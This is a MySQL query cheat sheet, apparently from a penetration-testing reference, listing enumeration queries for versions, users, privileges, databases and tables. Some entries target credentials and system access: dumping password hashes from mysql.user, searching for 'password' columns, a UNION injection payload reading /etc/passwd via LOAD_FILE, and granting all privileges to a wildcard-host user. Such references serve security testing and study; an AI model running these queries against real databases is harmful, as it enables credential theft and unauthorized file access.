# Queries Cheat Sheet

Some of the queries in the table below can only be run by an admin. These are marked with "_-- \[priv\]"_ at the end of the query.

<table>
  <thead>
    <tr>
      <th style="text-align:left">Usage</th>
      <th style="text-align:left">Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Version</td>
      <td style="text-align:left"><code>SELECT @@version</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Comments</td>
      <td style="text-align:left">
        <p><code>SELECT 1; #comment</code>
        </p>
        <p><code>SELECT /*comment*/1;</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current User</td>
      <td style="text-align:left">
        <p><code>SELECT user();</code>
        </p>
        <p><code>SELECT system_user;</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Users</td>
      <td style="text-align:left"><code>SELECT user FROM mysql.user;</code><em> <code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Password Hashes</td>
      <td style="text-align:left"><code>SELECT host, user, password FROM mysql.user;</code><em> <code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Privileges</td>
      <td style="text-align:left">
        <p><code>#List user privileges</code><em> <code>-- [priv]</code></em>
        </p>
        <p><code>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges</code>
        </p>
        <p><code>#List privs on databases (schemas)</code><em><code> --[priv]</code></em>
        </p>
        <p><code>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;</code>
        </p>
        <p><code>#List privs on columns</code><em> <code>--[priv]</code></em>
        </p>
        <p><code>SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List DBA Accounts</td>
      <td style="text-align:left">
        <p><code>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &apos;SUPER&apos;;</code><em> <code>-- [priv]</code></em>
        </p>
        <p><code>SELECT host, user FROM mysql.user WHERE Super_priv = &apos;Y&apos;;</code><em> <code>-- [priv]</code></em>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current Database</td>
      <td style="text-align:left"><code>SELECT database()</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Databases</td>
      <td style="text-align:left">
        <p><code>SELECT schema_name FROM information_schema.schemata;</code><em><code>--for MySQL &gt;= 5.0 </code></em>
        </p>
        <p><code>SELECT distinct(db) FROM mysql.db</code><em><code> --[priv]</code></em>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Tables</td>
      <td style="text-align:left"><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &apos;mysql&apos; AND table_schema != &apos;information_schema&apos;</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Columns</td>
      <td style="text-align:left"><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &apos;mysql&apos; AND table_schema != &apos;information_schema&apos;</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Find Tables from Column Name</td>
      <td style="text-align:left">
        <p><em><code>If you want to list all the table names that contain a column LIKE &apos;%password%&apos;:</code></em>
        </p>
        <p><code>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = &apos;password&apos;;</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Hostname, IP Address</td>
      <td style="text-align:left"><code>SELECT @@hostname;</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Create Users</td>
      <td style="text-align:left"><code>CREATE USER test1 IDENTIFIED BY &#x2018;pass1&#x2032;; </code><em><code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Delete Users</td>
      <td style="text-align:left"><code>DROP USER test1; </code><em><code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Make User DBA</td>
      <td style="text-align:left"><code>GRANT ALL PRIVILEGES ON *.* TO test1@&apos;%&apos;; </code><em><code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Location of DB Files</td>
      <td style="text-align:left"><code>SELECT @@datadir;</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Reading Files</td>
      <td style="text-align:left"><code>&apos; UNION ALL SELECT LOAD_FILE(&apos;/etc/passwd&apos;) </code><em><code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Writing Files</td>
      <td style="text-align:left"><code>SELECT * FROM mytable INTO dumpfile &apos;/tmp/somefile&apos;; </code><em><code>--[priv]</code></em>
      </td>
    </tr>
  </tbody>
</table>

